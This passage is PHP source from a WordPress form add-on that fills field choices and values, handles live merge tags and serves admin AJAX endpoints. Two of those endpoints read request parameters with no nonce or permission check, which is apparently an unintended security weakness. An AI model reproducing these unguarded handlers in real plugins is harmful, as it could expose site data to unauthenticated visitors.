			$choices = json_decode( stripslashes( $posted_value ), ARRAY_A );

			/**
			 * We don't want to save _every_ choice presented into the meta.
			 * Only what was submitted.
			 *
			 * Still using an array here for flexibility.
			 */
			$gppa_choices[ $input_id ] = array();

			if ( $input_value ) {
				$gppa_choices[ $input_id ][ $input_value ] = rgar( $choices, $input_value );
			}
		}

		gform_update_meta( $entry['id'], 'gppa_choices', $gppa_choices, $form['id'] );

		return true;

	}

	public function entry_view_save_choices( $form, $lead_id, $original_entry ) {

		$this->maybe_save_choices_on_submission( RGFormsModel::get_lead( $lead_id ), $form );

	}

	public function modify_field_choices( $form, $ajax = false, $field_values = array() ) {

		if ( GFCommon::is_form_editor() || $this->_getting_current_entry ) {
			return $form;
		}

		if( GFCommon::is_entry_detail() ) {
			// @todo Ugh, this is super messy. Not sure that an $entry should be passed as $field_values. Let's revisit.
			$field_values = $this->get_current_entry();
		} else {
			$field_values = array_replace( (array) $field_values, $this->get_posted_field_values( $form ) );
		}

		foreach ( $form['fields'] as &$field ) {

			if ( empty( $field->choices ) ) {
				continue;
			}

			$field->choices = $this->get_input_choices( $field, $field_values );

			if( $field->get_input_type() == 'checkbox' ) {

				$inputs = array();
				$index = 1;

				foreach( $field->choices as $choice ) {

					if ( $index % 10 == 0 ) {
						$index++;
					}

					$inputs[] = array(
						'id' => sprintf( '%d.%d', $field->id, $index ),
						'label' => $choice['text']
					);

					$index++;

				}

				$field->inputs = $inputs;

			}

		}

		return $form;

	}

	public function get_current_entry() {
		// Avoid infinite loops...
		$this->_getting_current_entry = true;
		$entry = GFEntryDetail::get_current_entry();
		$this->_getting_current_entry = false;
		return $entry;
	}

	public function modify_field_values_date( $field, $value ) {

		$format    = empty( $field->dateFormat ) ? 'mdy' : esc_attr( $field->dateFormat );
		$date_info = GFCommon::parse_date( $value, $format );

		$day_value   = esc_attr( rgget( 'day', $date_info ) );
		$month_value = esc_attr( rgget( 'month', $date_info ) );
		$year_value  = esc_attr( rgget( 'year', $date_info ) );

		$date_array = $field->get_date_array_by_format(array( $month_value, $day_value, $year_value ));
		$date_array_values = array_values( $date_array );

		foreach ( $field->inputs as $input_index => &$input ) {
			$input['defaultValue'] = $date_array_values[ $input_index ];
		}

		return $field;

	}

	public function modify_field_values( $form, $ajax = false , $field_values = array() ) {

		if ( GFCommon::is_form_editor() || $this->_getting_current_entry ) {
			return $form;
		}

		if( GFCommon::is_entry_detail() ) {
			// @todo Ugh, this is super messy. Not sure that an $entry should be passed as $field_values. Let's revisit.
			$field_values = $this->get_current_entry();
		} else {
			$field_values = array_replace( (array) $field_values, $this->get_posted_field_values( $form ) );
		}

		foreach ( $form['fields'] as &$field ) {
			if ( ! $field->inputs || in_array( $field->type, self::get_interpreted_multi_input_field_types() ) ) {
				if ( $value = $this->get_input_values( $field, 'value', $field_values ) ) {
					$filter_name = 'gppa_modify_field_values_' . $field->type;

					if ( has_filter($filter_name ) ) {
						$field = apply_filters( $filter_name, $field, $value, $field_values );
					} else {
						$field->defaultValue = $value;
					}
				}

				continue;
			}

			foreach ( $field->inputs as &$input ) {
				if ( $value = $this->get_input_values( $field, $input['id'], $field_values ) ) {
					if( $field->get_input_type() == 'checkbox' ) {
						$field = $this->select_choice( $field, $value );
					} else {
						$input['defaultValue'] = $value;
					}
				}
			}
		}

		return $form;

	}

	public function select_choice( $field, $value ) {
		foreach( $field->choices as &$choice ) {
			if( $choice['value'] == $value ) {
				$choice['isSelected'] = true;
			}
		}
		return $field;
	}

	public function prep_live_merge_tags( $form ) {

		if ( !is_array($form['fields']) ) {
			return $form;
		}

		foreach ( $form['fields'] as &$field ) {
			$field = $this->prep_field_live_merge_tags( $field, $form );
		}

		return $form;

	}

	public function prep_field_live_merge_tags( $field, $form ) {

		$properties_to_transform = array(
			'label',
			'description',
			'placeholder',
			'errorMessage',
			'content',
			'choices' => array(
				'text',
			),
		);

		foreach ( $properties_to_transform as $key => $value ) {
			$property       = is_numeric( $key ) ? $value : $key;
			$sub_properties = is_numeric( $key ) ? null : $value;

			if ( $sub_properties && ! empty( $field[ $property ] ) ) {
				/* Saved in new variable to prevent issue with "indirect modification" */
				$field_to_modify = $field[ $property ];

				foreach ( $field_to_modify as $field_child_index => $field_child_props ) {
					foreach ( $field_child_props as $field_child_prop => $field_child_prop_value ) {
						if ( array_search( $field_child_prop, $sub_properties ) === false ) {
							continue;
						}

						$child_field = $this->prep_replace_live_merge_tag( $field_child_prop_value, $form );

						$field_to_modify[ $field_child_index ][ $field_child_prop ] = $child_field;
					}
				}

				$field[ $property ] = $field_to_modify;

				continue;
			}

			$field[ $property ] = $this->prep_replace_live_merge_tag( $field[ $property ], $form );
		}

		return $field;

	}

	public function prep_replace_live_merge_tag( $value, $form ) {

		if( ! is_string( $value ) ) {
			return $value;
		}

		preg_match_all( '/@({(.*?):?(.+?)})/', $value, $matches, PREG_SET_ORDER );

		if ( ! $matches || ! is_array( $matches ) ) {
			return $value;
		}

		foreach ( $matches as $match ) {
			$value = str_replace( $match[0], '#!GPPA!!' . $match[1] . '!!GPPA!#', $value );
		}

		return $value;

	}

	public function replace_live_merge_tag( $form_string, $form ) {

		preg_match_all( '/(#!GPPA!!)(.*?)(!!GPPA!#)/', $form_string, $matches, PREG_SET_ORDER );

		if ( ! $matches ) {
			return $form_string;
		}

		foreach ( $matches as $match ) {
			$full_match      = $match[0];
			$merge_tag       = $match[2];
			$merge_tag_value = GFCommon::replace_variables( $merge_tag, $form, null );
			/*
			 * @deprecated
			 */
			$output          = $merge_tag_value ? $merge_tag_value : apply_filters( 'gppa_live_merge_tag_loading_text', 'Loading...', $merge_tag, $form );

			$form_string = str_replace( $full_match, '<span data-gppa-live-merge-tag="' . esc_attr( $merge_tag ) . '">' . $output . '</span>', $form_string );
		}

		return $form_string;

	}

	/* Admin Methods */
	public function ajax_get_object_type_properties() {

		$object_type            = rgar( $this->_object_types, $_REQUEST['object-type'] );
		$primary_property_value = rgar( $_REQUEST, 'primary-property-value' );

		if ( ! $object_type ) {
			return array();
		}

		$output = array();

		foreach ( $object_type->get_properties( $primary_property_value ) as $property_id => $property ) {
			if ( is_numeric( $property_id ) && is_string( $property ) ) {
				$output['ungrouped'] = array(
					'value' => $property,
					'label' => $property,
				);

				continue;
			}

			$output[ rgar( $property, 'group', 'ungrouped' ) ][] = array_merge( $property, array(
				'value' => $property_id,
			) );
		}

		foreach ( $output as $group_id => $group_items ) {
			usort( $output[ $group_id ], function ( $a, $b ) {
				if ( is_array( $a ) ) {
					$a = $a['label'];
				}

				if ( is_array( $b ) ) {
					$b = $b['label'];
				}

				return strnatcmp( $a, $b );
			} );
		}

		wp_die( json_encode( $output ) );

	}

	public function ajax_get_property_values() {

		$object_type_id         = $_REQUEST['object-type'];
		$object_type            = rgar( $this->_object_types, $object_type_id );
		$primary_property_value = rgar( $_REQUEST, 'primary-property-value' );

		if ( ! $object_type ) {
			return array();
		}

		$properties  = $object_type->get_properties( $primary_property_value );
		$property_id = $_REQUEST['property'];

		$property = rgar( $properties, $property_id );

		if ( $property_id === 'primary-property' ) {
			$property = $object_type->get_primary_property();
		}

		if ( ! $property ) {
			return array();
		}

		$property_args = rgar( $property, 'args', array() );

		$output = call_user_func_array( $property['callable'], $property_args );

		$label_filter = "gppa_property_label_{$object_type_id}_{$property_id}";

		if ( has_filter( $label_filter ) ) {
			$associative_output = array();

			foreach ( $output as $key => $value ) {
				$associative_output[ $value ] = apply_filters( $label_filter, $value );
			}

			$output = $associative_output;
		}

		/**
		 * Transform array to flattened array for JavaScript ordering
		 */
		if ( gppa_is_assoc_array( $output ) ) {
			natcasesort( $output );

			$non_associative_output = array();

			foreach ( $output as $value => $label ) {
				$non_associative_output[] = array( $value, $label );
			}

			$output = $non_associative_output;
		} else {
			natcasesort( $output );
		}

		/* Remove duplicate property values */
		$output = array_unique( $output, SORT_REGULAR );

		wp_die( json_encode( $output ) );

	}

	public function ajax_get_batch_field_html() {

		check_ajax_referer( 'gppa', 'security' );

		$form         = GFAPI::get_form( $_REQUEST['form-id'] );
		$fields       = rgar( $_REQUEST, 'field-ids', array() );
		$field_values = rgar( $_REQUEST, 'field-values', array() );
		$lead_id      = rgar( $_REQUEST, 'lead-id', 0 );
		$field_html   = array();

		// Default to no tabindex but allow 3rd-parties to override.
		GFCommon::$tab_index = gf_apply_filters( array( 'gform_tabindex', $form['id'] ), 0, $form );

		/* Merge HTTP referer GET params into field values for parameter [pre]population */
		$referer_parsed = parse_url( rgar( $_SERVER, 'HTTP_REFERER' ) );
		parse_str( $referer_parsed['query'], $referer_get_params );

		$GLOBALS['gppa-field-values'] = $referer_get_params + $field_values;

		foreach ( $fields as $field_id ) {

			$field          = GFFormsModel::get_field( $form, $field_id );
			$hydrated_field = $this->hydrate_field( $field, $form, $GLOBALS['gppa-field-values'], $lead_id );

			$field_html[ $field_id ] = apply_filters( 'gppa_get_batch_field_html', rgar( $hydrated_field, 'html' ), rgar( $hydrated_field, 'field' ) );

			/* Add hydrated field value to field values object */
			$GLOBALS['gppa-field-values'][ $field_id ] = rgar( $hydrated_field, 'field_value' );

		}

		wp_die( json_encode( $field_html ) );

	}

	public function ajax_get_live_merge_tag_values() {

		check_ajax_referer( 'gppa', 'security' );

		$form = GFAPI::get_form( $_REQUEST['form-id'] );

		$merge_tag_results = array();
		$fake_lead         = array();

		foreach ( rgar( $_REQUEST, 'field-values', array() ) as $input => $value ) {
			$field = GFFormsModel::get_field( $form, $input );

			if ( ! $field ) {
				continue;
			}

			if( $field->has_calculation() ) {
				$fake_lead[ $input ] = $value;
			} else {
				$fake_lead[ $input ] = $field->get_value_save_entry( $value, $form, $input, null, null );
			}

		}

		/**
		 * @todo Add support for also replacing merge tags in things like {all_fields}
		 */
		foreach ( rgar( $_REQUEST, 'merge-tags', array() ) as $merge_tag ) {
			$merge_tag_results[ $merge_tag ] = GFCommon::replace_variables( $merge_tag, $form, $fake_lead );
		}

		wp_die( json_encode( $merge_tag_results ) );

	}

	public function field_standard_settings() {
		?>
		<!-- Populated with Vue -->
		<div id="gppa"></div>
		<?php
	}

	public function add_enabled_field_class( $css_class, $field, $form ) {
		if ( rgar( $field, 'gppa-choices-enabled' ) ) {
			$css_class .= ' gppa-choices-enabled';
		}

		if ( rgar( $field, 'gppa-values-enabled' ) ) {
			$css_class .= ' gppa-values-enabled';
		}

		return $css_class;
	}

}

function gp_populate_anything() {
	return GP_Populate_Anything::get_instance();
}

GFAddOn::register( 'GP_Populate_Anything' );
